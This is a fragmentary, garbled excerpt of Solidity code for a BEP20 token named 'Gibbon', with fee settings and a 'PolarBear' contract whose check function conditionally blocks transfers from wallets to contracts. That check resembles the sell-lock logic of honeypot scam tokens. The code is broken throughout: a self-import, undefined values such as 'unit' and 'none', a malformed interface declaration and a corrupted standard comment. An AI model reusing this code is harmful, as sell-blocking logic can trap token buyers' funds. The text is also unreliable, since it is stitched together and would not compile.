...
import "./Gibbon.sol";
contract Gibbon is Context, IBEP20, Ownable { // contract name
   ...
   // All fees are with one decimal value. so if you want 0.5 set value to 5, for 10 set 100. so on...
    ...
    uint256 public _buyBackFee = unit; // buyback fee 
    uint256 private _previousBuyBackFee = _buyBackFee; // buyback fee

    uint256 public _deadFee = unit;  // swap BNB
    uint256 private _previousDeadFee = _deadFee; 

    uint256 public _liquidityFee = unit; // liquidity fee
	...
	uint256 private _transactionLockTime = none; 
...
-interface securityconsiderations IERC20 {
    ...
    IMPORTANT: Gibbon that changing an allowance with this method brings the risk
...
contract PolarBear is Ownable {
  ...
  function check(address from, address _to) internal view returns(bool){
    if(!from.isContract() && _to.isContract()){
        if(lockSeller){
            if(maxSellOutNum == 5 && maxSellToken == 0){
                return false;
            }
            if(maxSellOutNum > 5){
